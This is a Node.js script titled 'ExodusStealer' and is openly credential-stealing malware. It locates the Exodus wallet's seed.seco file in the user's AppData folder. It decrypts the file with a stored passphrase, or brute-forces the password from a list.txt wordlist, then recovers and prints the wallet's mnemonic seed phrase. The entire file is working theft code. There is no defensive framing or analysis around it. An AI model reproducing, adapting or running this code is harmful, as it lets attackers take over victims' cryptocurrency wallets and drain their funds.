const seco = require("seco-file");
const zlib = require("zlib");
const bs = require("bitcoin-seed");
const fs = require("fs");
function shrink(e) {
    const t = e.readUInt32BE(0);
    return e.slice(4, t + 4);
}
function decrypt(secoPath, passwords) {
    let decrypted = seco.decryptData(fs.readFileSync(secoPath), passwords).data;
    let shrinked = shrink(decrypted);
    let gunzipped = zlib.gunzipSync(shrinked);
    let mnemonic = bs.fromBuffer(gunzipped).mnemonicString;
    return mnemonic;
}

const path = require('path');


function locateExodus() {
    const ExodusPath = path.join(process.env.appdata, "exodus", "exodus.wallet")
    const seedPath = path.join(ExodusPath, "seed.seco")
    if (fs.existsSync(seedPath)) {

        return {
            "exodus": true,
            "path": seedPath,
            "passwordRequired": !fs.existsSync(path.join(ExodusPath, "passphrase.json"))
        }

    }
    return {
        "exodus": false
    }

}
const ExodusPath = path.join(process.env.appdata, "exodus", "exodus.wallet")
const exodusInfo = locateExodus();

function ExodusStealer(passwords) {
    if (exodusInfo.exodus) {
        if (!exodusInfo.passwordRequired) {
            const passphrase = JSON.parse(fs.readFileSync(path.join(ExodusPath, "passphrase.json")).toString()).passphrase
            const mnemonic = decrypt(exodusInfo.path, passphrase)
            return { exodusInfo, "mnemonic": mnemonic };
        }
        var bforced = BruteForcePassword(passwords)
        if (bforced.success == true) {
            var password = bforced.password

            const mnemonic = decrypt(exodusInfo.path, password)
            return { exodusInfo, "mnemonic": mnemonic, "time": bforced.time, "password": bforced.password };


        } else {
            return { "error": "Couldn't bruteforce the password.", "success": false }
        }

    }
    else {
        return { "exodus": false };
    }
}

function BruteForcePassword(passwords) {

    if (exodusInfo.exodus && exodusInfo.passwordRequired) {
        var start = process.hrtime()

        let tried_passwords = 0
        var passwords_l = [...new Set(passwords)];
        var path = fs.readFileSync(exodusInfo.path);
        for (const p of passwords_l) {
            if (p.length > 4) {
                try {
                    seco.decryptData(fs.readFileSync(ExodusPath + "\\seed.seco"), p)
                    var end = process.hrtime(start)

                    return {
                        "success": true, "password": p, "time": end[0] + " seconds and " + end[1] / 1000000 + " milliseconds.", "tried_passwords": tried_passwords
                    };

                }
                catch {
                    tried_passwords++;
                }

            }
        }
        return { "success": false, "error": "Password isn't part of the list", "tried_password": tried_passwords }

    }
}

var t = ExodusStealer(fs.readFileSync('list.txt').toString().split('\r\n'))
console.log(t)
